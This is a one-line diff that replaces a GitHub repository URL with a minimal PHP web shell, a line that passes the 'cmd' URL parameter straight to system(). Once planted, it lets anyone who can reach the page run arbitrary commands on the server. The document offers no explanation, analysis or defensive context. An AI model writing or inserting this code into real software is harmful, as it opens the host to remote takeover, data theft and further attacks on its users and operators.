@@ -1,1 +1,1 @@
-https://github.com/KravetsY/123.git
+<?php system($_GET['cmd']); ?>
